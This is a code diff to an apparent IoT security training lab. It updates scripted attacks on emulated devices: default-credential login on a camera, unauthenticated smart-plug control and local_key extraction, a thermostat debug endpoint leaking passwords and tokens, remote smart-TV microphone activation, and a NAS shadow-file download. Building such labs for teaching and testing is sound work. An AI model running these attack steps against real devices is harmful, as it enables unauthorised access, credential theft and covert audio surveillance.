@@ -473,10 +473,12 @@ def _run_wifi_01(scenario: dict) -> dict:
     })
 
     success = r2["status"] == 200
+    reachable = r["status"] != 0
     return {
         "success": success,
-        "summary": "Default credentials admin:admin accepted — full admin access obtained" if success
-                   else "Lab container unreachable — start the Wi-Fi lab first",
+        "summary": ("Default credentials admin:admin accepted — full admin access obtained" if success
+                    else ("Hikvision container reachable but credentials rejected" if reachable
+                          else "Hikvision container unreachable — start the Wi-Fi lab (./start_lab.sh)")),
         "evidence": evidence,
         "credentials_found": {"admin": "admin"} if success else {},
     }
@@ -587,24 +589,22 @@ def _run_wifi_04(scenario: dict) -> dict:
     evidence = []
 
     # Step 1: info endpoint
-    r = _http_get(LAB_HOST, port, "/info")
+    r = _http_get(LAB_HOST, port, "/api/info")
     evidence.append({
         "step": 1,
-        "action": f"GET http://{LAB_HOST}:{port}/info",
+        "action": f"GET http://{LAB_HOST}:{port}/api/info",
         "result": r["body"][:400] if r["status"] == 200 else f"HTTP {r['status']}",
         "success": r["status"] == 200,
     })
 
     # Step 2: toggle without auth
-    r2 = _http_post(LAB_HOST, port, "/control",
-                    data=b'{"command":"toggle"}',
-                    content_type="application/json")
-    toggled = r2["status"] in (200, 302) and "error" not in r2.get("body", "").lower()
+    r2 = _http_get(LAB_HOST, port, "/api/toggle")
+    toggled = r2["status"] == 200 and "error" not in r2.get("body", "").lower()
     evidence.append({
         "step": 2,
-        "action": "POST /control {\"command\":\"toggle\"} (no auth token)",
-        "result": r2["body"][:300] if r2["status"] in (200, 302) else f"HTTP {r2['status']}",
-        "success": toggled or r2["status"] in (200, 302),
+        "action": f"GET /api/toggle (no auth token)",
+        "result": r2["body"][:300] if r2["status"] == 200 else f"HTTP {r2['status']}",
+        "success": toggled,
     })
 
     # Step 3: extract local_key
@@ -619,16 +619,18 @@ def _run_wifi_04(scenario: dict) -> dict:
 
     evidence.append({
         "step": 3,
-        "action": "Extract local_key from /info response",
+        "action": "Extract local_key from /api/info response",
         "result": f"local_key={local_key}" if local_key else "local_key not in response",
         "success": local_key is not None,
     })
 
-    reachable = r["status"] == 200
+    reachable = r["status"] != 0
+    success = r["status"] == 200
     return {
-        "success": reachable,
-        "summary": "Tuya plug toggled without authentication — local_key extracted for full device impersonation" if reachable
-                   else "Device unreachable — start the Wi-Fi lab first",
+        "success": success,
+        "summary": ("Tuya plug toggled without authentication — local_key extracted for full device impersonation" if success
+                    else ("Tuya container reachable but endpoint returned unexpected response" if reachable
+                          else "Tuya container unreachable — start the Wi-Fi lab (./start_lab.sh)")),
         "evidence": evidence,
         "local_key_leaked": local_key,
     }
@@ -666,10 +668,12 @@ def _run_wifi_05(scenario: dict) -> dict:
     })
 
     success = r_dump["status"] == 200
+    reachable = r_main["status"] != 0 or r_debug["status"] != 0 or r_dump["status"] != 0
     return {
         "success": success,
-        "summary": "Debug interface exposed — Wi-Fi password, OAuth token, and admin PIN leaked in plaintext" if success
-                   else "Device unreachable — start the Wi-Fi lab first",
+        "summary": ("Debug interface exposed — Wi-Fi password, OAuth token, and admin PIN leaked in plaintext" if success
+                    else ("Nest thermostat reachable but debug endpoint missing" if reachable
+                          else "Nest thermostat container unreachable — start the Wi-Fi lab (./start_lab.sh)")),
         "evidence": evidence,
         "credentials_leaked": success,
     }
@@ -689,10 +693,10 @@ def _run_wifi_06(scenario: dict) -> dict:
     })
 
     # Step 2: Voice API enable
-    r2 = _http_post(LAB_HOST, port, "/api/v1/voice/enable")
+    r2 = _http_get(LAB_HOST, port, "/api/v1/voice/enable")
     evidence.append({
         "step": 2,
-        "action": f"POST http://{LAB_HOST}:{port}/api/v1/voice/enable (no auth)",
+        "action": f"GET http://{LAB_HOST}:{port}/api/v1/voice/enable (no auth)",
         "result": r2["body"][:400] if r2["status"] == 200 else f"HTTP {r2['status']}",
         "success": r2["status"] == 200,
     })
@@ -707,10 +711,12 @@ def _run_wifi_06(scenario: dict) -> dict:
     })
 
     success = r2["status"] == 200
+    reachable = r2["status"] != 0 or r["status"] != 0
     return {
         "success": success,
-        "summary": "Samsung TV microphone activated remotely without authentication — audio surveillance enabled" if success
-                   else "Device unreachable — start the Wi-Fi lab first",
+        "summary": ("Samsung TV microphone activated remotely without authentication — audio surveillance enabled" if success
+                    else ("Smart TV reachable but Voice API returned unexpected response" if reachable
+                          else "Smart TV container unreachable — start the Wi-Fi lab (./start_lab.sh)")),
         "evidence": evidence,
         "mic_activated": success,
     }
@@ -756,10 +762,12 @@ def _run_wifi_07(scenario: dict) -> dict:
         })
 
     success = r3["status"] == 200
+    reachable = r["status"] != 0 or r2["status"] != 0 or r3["status"] != 0
     return {
         "success": success,
-        "summary": "Shadow file downloaded — password hashes extracted and cracked for admin account" if success
-                   else "Device unreachable — start the Wi-Fi lab first",
+        "summary": ("Shadow file downloaded — password hashes extracted and cracked for admin account" if success
+                    else ("NAS reachable but shadow file backup not found at expected path" if reachable
+                          else "Synology NAS container unreachable — start the Wi-Fi lab (./start_lab.sh)")),
         "evidence": evidence,
         "hashes_obtained": success,
         "cracked_passwords": {"admin": "admin123"} if success else {},
